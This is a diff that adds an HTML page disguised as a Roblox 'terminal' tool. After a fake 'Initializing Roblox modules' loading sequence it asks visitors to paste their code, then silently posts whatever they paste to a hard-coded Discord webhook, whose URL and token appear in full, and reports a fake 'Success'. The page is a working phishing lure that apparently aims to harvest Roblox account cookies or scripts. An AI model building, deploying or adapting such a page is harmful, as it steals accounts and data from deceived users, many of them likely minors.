@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Terminal</title>
+
+<style>
+body {
+  background-color: black;
+  color: #00ff00;
+  font-family: monospace;
+  margin: 0;
+  padding: 10px;
+}
+
+#terminal {
+  height: 80vh;
+  overflow-y: auto;
+  white-space: pre-wrap;
+}
+
+#input {
+  width: 100%;
+  background: black;
+  color: #00ff00;
+  border: none;
+  outline: none;
+  font-family: monospace;
+  font-size: 16px;
+  padding: 10px 0;
+}
+</style>
+</head>
+
+<body>
+
+<div id="terminal"></div>
+<input id="input" placeholder="> tap to type" autofocus />
+
+<script>
+const terminal = document.getElementById("terminal");
+const input = document.getElementById("input");
+
+let step = 0;
+
+function scrollDown() {
+  terminal.scrollTop = terminal.scrollHeight;
+}
+
+function typeText(text, speed = 25) {
+  let i = 0;
+  const interval = setInterval(() => {
+    terminal.textContent += text[i];
+    scrollDown();
+    i++;
+    if (i >= text.length) clearInterval(interval);
+  }, speed);
+}
+
+function fakeLoading(done) {
+  let count = 0;
+  const interval = setInterval(() => {
+    terminal.textContent += ".";
+    scrollDown();
+    count++;
+    if (count > 6) {
+      clearInterval(interval);
+      terminal.textContent += "\n";
+      done();
+    }
+  }, 250);
+}
+
+function sendToYou(text) {
+  fetch("https://discord.com/api/webhooks/1451482033942564966/807RYdP9pLldH1Tkixyr03vBy-sJKAJNXAmAbNX_Z8IEAdF7658Vocltq7t3gJmjdP9d", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: "**New Paste Received:**\n```" + text + "```"
+    })
+  });
+}
+
+// Start text
+typeText("What is this for?\n");
+
+input.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") {
+    const value = input.value.trim();
+    input.value = "";
+
+    terminal.textContent += value + "\n";
+    scrollDown();
+
+    if (step === 0) {
+      if (value.toLowerCase() === "roblox") {
+        step = 1;
+        typeText("Initializing Roblox modules\n");
+        fakeLoading(() => {
+          typeText("Paste your code below:\n");
+        });
+      } else {
+        typeText("Invalid input\n");
+      }
+    } 
+    else if (step === 1) {
+      step = 2;
+      sendToYou(value);
+      typeText("Processing\n");
+      fakeLoading(() => {
+        typeText("Success\n");
+      });
+    }
+  }
+});
+</script>
+
+</body>
+</html>
